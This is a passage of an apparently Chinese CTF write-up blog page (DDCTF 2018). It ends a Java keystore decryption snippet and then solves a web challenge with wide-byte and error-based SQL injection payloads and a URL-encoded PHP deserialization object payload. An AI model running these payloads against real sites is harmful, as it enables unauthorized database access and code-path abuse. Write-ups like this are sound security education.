class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; hexString.length(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            tmp = <span class="string">"0000"</span></span><br><span class="line">                    + Integer.toBinaryString(Integer.parseInt(hexString</span><br><span class="line">                            .substring(i, i + <span class="number">1</span>), <span class="number">16</span>));</span><br><span class="line">            bString += tmp.substring(tmp.length() - <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> bString;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">byte2hex</span><span class="params">(<span class="keyword">byte</span>[] b)</span></span>&#123;</span><br><span class="line">        StringBuilder hs = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">0</span>; (b != <span class="keyword">null</span>) &amp;&amp; (n &lt; b.length); n++)&#123;</span><br><span class="line">            String stmp = Integer.toHexString(b[n] &amp; <span class="number">0xFF</span>);</span><br><span class="line">            <span class="keyword">if</span> (stmp.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hs.append(<span class="string">'0'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            hs.append(stmp);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hs.toString().toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;  </span><br><span class="line">    	</span><br><span class="line">        String e = <span class="string">"*****"</span>;</span><br><span class="line">    	String p = <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] flag = hexString2binaryString(e).getBytes();</span><br><span class="line">        String ksPath = <span class="string">"C:\\Users\\星灵\\eclipse-workspace\\1\\src\\sdl.ks"</span>;</span><br><span class="line">        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class="line">        FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(ksPath);</span><br><span class="line">        keyStore.load(inputStream, p.toCharArray());</span><br><span class="line">        Key key = keyStore.getKey(<span class="string">"www.didichuxing.com"</span>, p.toCharArray());  </span><br><span class="line">        Certificate cert = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>);</span><br><span class="line">        PublicKey publicKey = cert.getPublicKey();</span><br><span class="line">        Cipher cipher = Cipher.getInstance(key.getAlgorithm());    </span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, publicKey);</span><br><span class="line">        <span class="keyword">byte</span>[] data = cipher.doFinal(flag);</span><br><span class="line">        String a=<span class="keyword">new</span> String(data);</span><br><span class="line">        System.out.println(a);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="注入的奥秘"><a href="#注入的奥秘" class="headerlink" title="注入的奥秘"></a>注入的奥秘</h2><p>源码里可以找到一个注释了的BIG5的百度文库链接<br>很明显的提示，宽字节注入，注入点也很明显<br>先尝试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1么&apos;or 1 = 1 uunionnion select 1,2,dadatabasetabase()%23</span><br></pre></td></tr></table></figure></p>
+<p>可以回显出数据库sqli，但好像没什么卵用<br>发现报错有回显，感觉报错注入简单一点<br>扔三个pyload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1么&apos;and(select 1 from(select count(*),concat((select (select (select concat(0x7e,table_name,0x7e))) </span><br><span class="line">from information_schema.tables where table_schema=0x73716C69%20 limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br><span class="line"></span><br><span class="line">1么&apos;and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) </span><br><span class="line">from information_schema.columns where table_schema=0x73716C69 and table_name=0x726F7574655F72756C6573 limit 0,1),floor(rand(0)*2))x from</span><br><span class="line">information_schema.tables group by x)a)%23</span><br><span class="line"></span><br><span class="line">1%E4%B9%88&apos;and(select 1 from(select count(*),concat((select (select (select concat(0x7e,pattern,0x7e))) </span><br><span class="line">from sqli.route_rules limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure></p>
+<p>route_rules表里有个static/bootstrap/css/backup.css<br>是个zip，拿下来进行源码审计<br>justtry/try可以看出一个反序列化，实例化一个test对象，它反序列化的时候调用__destruct()<br>直接上payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O%3A17%3A%22Index%5CHelper%5CTest%22%3A2%3A%7Bs%3A9%3A%22user_uuid%22%3Bs%3A36%3A%225d71b644-ee63-4b11-9c13-da3c4ac35b8d%22%3Bs%3A2</span><br><span class="line">%3A%22fl%22%3BO%3A17%3A%22Index%5CHelper%5CFlag%22%3A1%3A%7Bs%3A3%3A%22sql%22%3BO%3A16%3A%22Index%5CHelper%5CSQL%22%3A2%3A%7Bs%3A3%</span><br><span class="line">3A%22dbc%22%3BN%3Bs%3A3%3A%22pdo%22%3BN%3B%7D%7D%7D</span><br></pre></td></tr></table></figure></p>
+<p>post上去getflag</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">N0rth3ty</a>
+            <p>原文链接：<a href="http://yoursite.com/2018/04/22/DDctf-Writrup/">http://yoursite.com/2018/04/22/DDctf-Writrup/</a>
+            <p>发表日期：<a href="http://yoursite.com/2018/04/22/DDctf-Writrup/">April 22nd 2018, 1:30:41 pm</a>
+            <p>更新日期：<a href="http://yoursite.com/2018/04/22/DDctf-Writrup/">April 22nd 2018, 1:36:06 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2018/05/03/CISN-Writeup/" title= "CISN-Writeup">
+                    <div class="nextTitle">CISN-Writeup</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/04/01/强网杯web部分writeup/" title= "强网杯web部分writeup">
+                    <div class="prevTitle">强网杯web部分writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:northbhat@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/northity" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-number">1.</span> <span class="toc-text">re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Baby-MIPS"><span class="toc-number">1.1.</span> <span class="toc-text">Baby MIPS</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#╯°□°）╯︵-┻━┻"><span class="toc-number">2.1.</span> <span class="toc-text">(╯°□°）╯︵ ┻━┻</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四扩展FS"><span class="toc-number">2.2.</span> <span class="toc-text">第四扩展FS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#流量分析"><span class="toc-number">2.3.</span> <span class="toc-text">流量分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#安全通信"><span class="toc-number">2.4.</span> <span class="toc-text">安全通信</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">3.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库的秘密"><span class="toc-number">3.1.</span> <span class="toc-text">数据库的秘密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#专属链接"><span class="toc-number">3.2.</span> <span class="toc-text">专属链接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注入的奥秘"><span class="toc-number">3.3.</span> <span class="toc-text">注入的奥秘</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 35
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href= "/2019/03/02/Sql注入手册/" >Sql注入手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/29</span><a class="archive-post-title" href= "/2019/01/29/前端安全笔记/" >前端安全笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/17</span><a class="archive-post-title" href= "/2019/01/17/JSONP劫持/" >JSONP劫持</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/27</span><a class="archive-post-title" href= "/2018/12/27/SWPUCTF复现/" >SWPUCTF复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span><a class="archive-post-title" href= "/2018/11/29/BCTF-Web签到/" >BCTF Web签到</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2018/11/26/Docker入门笔记/" >Docker入门笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span><a class="archive-post-title" href= "/2018/11/22/PHP反序列化补充/" >PHP反序列化补充</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span><a class="archive-post-title" href= "/2018/11/19/从LCTF-WEB签到题看PHP反序列化/" >从LCTF WEB签到题看PHP反序列化</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/14</span><a class="archive-post-title" href= "/2018/11/14/phpphar协议对象注入/" >phpphar协议对象注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/HCTF-WEB部分题解/" >HCTF WEB部分题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/12</span><a class="archive-post-title" href= "/2018/11/12/上海大学生信息安全竞赛Web题解/" >上海大学生信息安全竞赛Web题解</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2018/11/09/SECCON-Web/" >SECCON Web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/phpinfo-with-LFI/" >phpinfo with LFI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href= "/2018/10/23/XSSme题目复现/" >XSSme题目复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/21</span><a class="archive-post-title" href= "/2018/10/21/渗透测试0x00-信息收集/" >渗透测试0x00 信息收集</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/19</span><a class="archive-post-title" href= "/2018/10/19/提权从入门到自闭/" >提权从入门到自闭</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/浅析SSTI/" >浅析SSTI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/Hash长度扩展攻击/" >Hash长度扩展攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2018/10/15/护网杯Web-WP/" >护网杯Web WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href= "/2018/10/01/XSSbot从入门到放弃/" >XSSbot从入门到放弃</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/2018/09/12/网鼎杯第三场WP/" >网鼎杯第三场WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/浅谈XXE漏洞/" >浅谈XXE漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/2018/09/11/网鼎杯第一场WP/" >网鼎杯第一场WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/12</span><a class="archive-post-title" href= "/2018/06/12/Bugku题目集锦0x02/" >Bugku题目集锦0x02</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/07</span><a class="archive-post-title" href= "/2018/06/07/Bugku题目集锦0x01/" >Bugku题目集锦0x01</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2018/05/25/Bugku题目集锦0x00/" >Bugku题目集锦0x00</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2018/05/03/CISN-Writeup/" >CISN-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href= "/2018/04/22/DDctf-Writrup/" >DDctf_Writrup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2018/04/01/强网杯web部分writeup/" >强网杯web部分writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Python笔记 0x01/" >Python笔记 0x01</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href= "/2018/02/07/Python笔记 0x02/" >Python笔记 0x02</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/04</span><a class="archive-post-title" href= "/2018/02/04/Python爬虫(一)/" >Python爬虫(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/03</span><a class="archive-post-title" href= "/2018/02/03/Python笔记 0x00/" >Python笔记 0x00</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/24</span><a class="archive-post-title" href= "/2018/01/24/教务系统成绩自动化推送脚本/" >教务系统成绩自动化推送脚本</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/01</span><a class="archive-post-title" href= "/2017/12/01/hexo博客的搭建/" >hexo博客搭建</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="WP"><span class="iconfont-archer">&#xe606;</span>WP</span>
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="前端安全"><span class="iconfont-archer">&#xe606;</span>前端安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="服务器"><span class="iconfont-archer">&#xe606;</span>服务器</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pentest"><span class="iconfont-archer">&#xe606;</span>Pentest</span>
+    
+        <span class="sidebar-tag-name" data-tags="Writeup SQL注入"><span class="iconfont-archer">&#xe606;</span>Writeup SQL注入</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "N0rth3ty"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
